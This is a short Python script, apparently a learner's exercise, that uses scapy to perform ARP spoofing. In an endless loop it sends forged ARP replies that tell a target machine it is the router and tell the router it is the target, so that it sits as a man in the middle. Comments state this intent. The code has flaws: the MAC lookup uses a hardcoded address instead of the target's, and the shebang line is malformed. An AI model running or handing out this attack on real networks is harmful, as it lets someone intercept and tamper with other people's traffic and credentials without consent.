#!usr/env python
import time

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_if):
    target_mac = get_mac("192.168.5.2")
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)
    scapy.send(arp_packet)

while True: # We have to keep sending the packets to keep being 'the man in the middle'
    spoof("10.0.3.7","10.0.3.1") # target_computer_ip, router_ip, tell the target I'm the router
    spoof("10.0.3.1","10.0.3.7") # router_ip, target_computer_ip, tell the router I'm the computer
    time.sleep(2) # To avoid sending too many packets
